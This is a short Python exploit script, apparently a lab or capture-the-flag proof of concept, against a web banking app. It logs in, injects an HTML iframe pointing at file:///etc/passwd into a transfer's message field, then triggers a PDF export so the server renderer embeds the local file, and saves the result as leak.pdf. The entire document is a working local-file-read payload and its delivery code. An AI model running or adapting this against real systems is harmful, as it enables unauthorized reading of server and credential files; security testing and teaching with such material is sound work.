#!/usr/bin/env python3
import os, requests, re

BASE = os.getenv('TARGET', 'http://127.0.0.1:5000')
USER = os.getenv('USER', 'user')
PASS = os.getenv('PASS', 'pass')

# Payload attempts local file read during pdf render
payload = '<iframe src="file:///etc/passwd"></iframe>'

s = requests.Session()
s.post(f"{BASE}/login", data={'username': USER, 'password': PASS}, timeout=10)
s.post(f"{BASE}/transfer", data={
    'recipient':'x','amount':'1','method':'AES','message':payload
}, timeout=10)
pdf = s.post(f"{BASE}/transactions/export", timeout=20)
open('leak.pdf','wb').write(pdf.content)
print('[+] wrote leak.pdf')
